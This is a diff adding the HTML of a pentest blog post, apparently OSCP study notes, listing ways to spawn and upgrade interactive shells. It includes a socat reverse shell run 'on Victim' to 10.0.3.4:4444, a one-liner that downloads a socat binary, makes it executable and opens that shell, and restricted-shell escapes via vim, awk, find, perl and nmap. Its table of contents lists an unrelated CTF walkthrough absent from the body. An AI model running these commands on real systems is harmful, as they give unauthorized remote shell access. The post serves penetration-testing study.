@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+  
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+    
+      <title>
+        mavisec :: posts :: Spawning Interactive TTY Shells 🐚
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+<meta
+  name="keywords"
+  content="mavisec, cybersecurity, penetration testing"
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="index.html" />
+
+
+
+
+
+<link rel="stylesheet" href="../../assets/style.css" />
+
+
+<link
+  rel="icon"
+  sizes="144x144"
+  href="/img/mavisec-short.png"
+/>
+<link rel="shortcut icon" href="img/mavisec-short.png" />
+
+
+<link href="../../assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="../../assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="../../assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="../../assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="../../assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="../../assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+<meta property="og:title" content="Spawning Interactive TTY Shells" />
+<meta property="og:description" content="An interactive shell is a shell that allows users to interact with a system by entering commands. It reads commands from the user, executes them, and displays the results." />
+<meta property="og:type" content="article" />
+
+  </head>
+  <body class="">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="../../"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text">
+      mavisec/</span>
+    <span class="logo__text" style="color:red">posts/</span>
+    <span class="logo__cursor"></span>
+
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="../">blog</a></li>
+        
+      
+        
+          <li><a href="../../hacktivity/">hacktivity</a></li>
+        
+      
+        
+          <li><a href="../../resume/">resume</a></li>
+        
+      
+        
+          <li><a href="../../whoami/">whoami</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="../">blog</a></li>
+      
+    
+      
+        <li><a href="../../hacktivity/">hacktivity</a></li>
+      
+    
+      
+        <li><a href="../../resume/">resume</a></li>
+      
+    
+      
+        <li><a href="../../whoami/">whoami</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Spawning Interactive TTY Shells 🐚</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2025-02-17
+        </span>
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="">#OSCP</a>&nbsp;
+
+          <a href="">#Spawning</a>&nbsp;
+        
+          <a href="">#Interactive</a>&nbsp;
+        
+          <a href="">#TTY</a>&nbsp;
+
+          <a href="">#Shells</a>&nbsp;
+
+                
+      </span>
+    
+
+    
+
+    <div class="post-content">
+
+  <h2>Table of Contents</h2>
+        <aside class="table-of-contents"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#Description">Description</a></li>
+    <li><a href="#Nmap-Scan">Nmap Scan</a></li>
+      <ul>
+        <li><a href="#Output">Output</a></li>        
+      </ul>
+    <li><a href="#IP">Open the IP in browser</a></li>
+    <li><a href="#ftp">Login Anonymously Using FTP</a></li>
+    <li><a href="#Wireshark">Open the downloaded file in Wireshark</a></li>
+    <li><a href="#browser">Open the found path in browser</a></li>
+    <li><a href="#path">We got path for Username and Password’s file</a></li>
+      <ul>
+        <li><a href="#usernames">We got usernames</a></li> 
+        <li><a href="#password">We got password</a></li>       
+      </ul>
+    <li><a href="#hydra">Use hydra to get the correct Username and Password</a></li>
+    <li><a href="#ssh">Use SSH to connect</a></li> 
+    <ul>
+        <li><a href="#exploits">Look for the Kernel exploits</a></li> 
+    </ul> 
+    <li><a href="#flag">Grab your flag..!</a></li>
+  </ul>
+</nav></aside>     
+
+<br/>
+<h2 id="Python pty module">Python pty module:</h2>     
+<pre>
+  <code>
+python -c 'import pty; pty.spawn("/bin/sh")'<br/>
+python3 -c 'import pty; pty.spawn("/bin/sh")' <br/>
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+  </code>
+</pre>
+
+<br/>
+<h2 id="Using socat">Using socat:</h2>
+<h3 id="On Kali (listen)">On Kali (listen):</h3>
+
+<pre>
+  <code>
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+  </code>
+</pre>
+
+<br/>
+
+<h3 id="On Victim (launch)">On Victim (launch):</h3>
+
+<pre>
+  <code>
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+  </code>
+</pre>
+
+<br/>
+
+<h3 id="If not download in Victim">If not download in Victim:</h3>
+
+<pre>
+  <code>
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  </code>
+</pre>
+
+<br/>
+
+<h2 id="Other ways">Other ways:</h2>
+
+<pre>
+  <code>
+Using python<br/>
+python -c 'import pty; pty.spawn("/bin/sh")'<br/>
+<br/>
+Echo<br/>
+echo 'os.system('/bin/bash')'<br/>
+<br/>
+sh<br/>
+/bin/sh -i<br/>
+<br/>
+bash<br/>
+/bin/bash -i<br/>
+<br/>
+Perl<br/>
+perl -e 'exec "/bin/sh";'<br/>
+<br/>
+(From within nmap)<br/>
+!sh
+  </code>
+</pre>
+
+<br/>
+
+<h2 id="Related Shell Escape Sequences">Related Shell Escape Sequences:</h2>
+<h3 id="Vi / Vim">Vi / Vim</h3>
+
+<pre>
+  <code>
+:!bash<br/>
+:set shell=/bin/bash<br/>
+:shell<br/>  
+  </code>
+</pre>
+
+<br/>      
+
+<h3 id="awk">awk</h3>
+
+<pre>
+  <code>
+awk 'BEGIN {system("/bin/bash")}' 
+  </code>
+</pre>
+
+<br/>
+
+<h3 id="find">find</h3>
+
+<pre>
+  <code>
+find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \; 
+  </code>
+</pre>
+
+
+<br/>
+
+<p>
+  If you wanna learn more about how to bpass linux restricted shell, following is the link <a href="44592-linux-restricted-shell-bypass-guide.pdf">44592-linux-restricted-shell-bypass-guide.pdf</a>. 
+</p>
+
+<p>Thanks for reading this post, if you like my work you can support by <a href="https://www.buymeacoffee.com/mavisec">buying me a pizza</a>. 🍕</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="../CVE-2016–2098/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">CVE-2016–2098 💎</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="../sickos/">
+                  <span class="button__text">SICKOS: 1.2 Walkthrough 🤒</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+       <footer class="footer">
+  <div class="footer__inner">
+    
+      
+      <div class="copyright">
+        <span> 
+          © 2021-2025
+        </span>
+      </div>
+      <div>       
+        <span>
+          <a href="https://creativecommons.org/licenses/by-nc/4.0/" target=”_blank”>license</a>
+        </span>
+      </div>
+
+    
+  </div>
+</footer>
+
+<script src="../../assets/main.js"></script>
+<script src="../../assets/prism.js"></script>
+      
+    </div>
+
+  </body>
+
+</html>
